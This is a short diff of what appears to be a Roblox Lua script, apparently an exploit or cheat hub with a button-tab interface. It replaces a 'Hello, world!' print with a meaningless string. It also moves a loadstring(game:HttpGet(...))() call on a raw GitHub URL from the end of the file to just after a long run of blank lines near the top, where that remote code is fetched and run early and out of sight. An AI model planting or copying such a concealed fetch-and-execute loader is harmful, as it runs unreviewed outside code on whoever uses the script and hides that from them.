@@ -1,4 +1,4 @@
-print("Hello, world!")
+print("aaaaaaa, aa")
 
 
 
@@ -195,7 +195,7 @@ print("Hello, world!")
 
 
 
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/wx-sources/3ad3m3n/refs/heads/main/nyt"))()
 local frameIds = {
     126236556586764,
     136412915020251,
@@ -11346,4 +11346,4 @@ UniversalTab:AddButton({
 
 
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/wx-sources/3ad3m3n/refs/heads/main/nyt"))()
+
